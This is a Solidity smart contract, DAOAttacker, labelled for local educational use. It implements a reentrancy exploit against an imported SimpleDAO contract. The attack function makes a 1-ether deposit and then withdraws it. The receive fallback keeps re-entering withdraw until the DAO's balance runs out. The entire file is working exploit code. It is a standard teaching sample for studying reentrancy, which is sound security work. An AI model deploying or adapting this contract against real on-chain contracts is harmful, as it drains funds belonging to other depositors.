// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleDAO.sol";

// FOR LOCAL EDUCATIONAL PURPOSES ONLY.
contract DAOAttacker {
    SimpleDAO public dao;
    uint256 public attackAmount = 1 ether;

    constructor(address _dao) {
        dao = SimpleDAO(_dao);
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ether to attack");
        // Deposit the initial seed
        dao.deposit{value: attackAmount}();
        // Start the recursive withdrawal
        dao.withdraw(attackAmount);
    }

    // Fallback/receive function triggered when the DAO sends ETH
    receive() external payable {
        // If the DAO still has enough balance, re-enter the withdraw function
        if (address(dao).balance >= attackAmount) {
            dao.withdraw(attackAmount);
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
